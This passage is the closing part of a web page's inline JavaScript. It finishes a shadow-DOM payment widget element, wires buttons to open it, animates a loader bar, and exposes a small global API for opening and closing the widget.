                setTimeout(function(){ if(ciInp) ciInp.focus(); }, 80);
            }

        }
        /* ── end _render ── */

        open(){
            if(!this._shadow.getElementById('ov')) this._render();
            this._isOpen = true;
            var o = this._shadow.getElementById('ov');
            if(o) o.classList.add('on');
        }

        close(){
            this._isOpen = false;
            var o = this._shadow.getElementById('ov');
            if(o) o.classList.remove('on');
        }

        get isOpen(){ return this._isOpen; }
    });

    /* ── wire [paymentopenbutton] clicks ── */
    function wireButtons(){
        document.querySelectorAll('[paymentopenbutton]').forEach(function(btn){
            btn.addEventListener('click', function(e){
                e.preventDefault();
                var w = document.querySelector('payment-widget');
                if(w) w.open();
            });
        });
    }

    if(document.readyState === 'loading'){
        document.addEventListener('DOMContentLoaded', wireButtons);
    } else {
        wireButtons();
    }

    /* loader bar */
    document.addEventListener('DOMContentLoaded', function(){
        var loader = document.querySelector('.PyIBB');
        if(loader){
            loader.style.opacity = '1';
            setTimeout(function(){ loader.style.opacity = '0'; }, 800);
        }
    });

    /* global API */
    window.mainApp = {
        payment: {
            open:  function(){ var w=document.querySelector('payment-widget'); if(w) w.open(); },
            close: function(){ var w=document.querySelector('payment-widget'); if(w) w.close(); },
            get isOpen(){ var w=document.querySelector('payment-widget'); return w?w.isOpen:false; }
        }
    };
})();
</script>
</body>
</html>
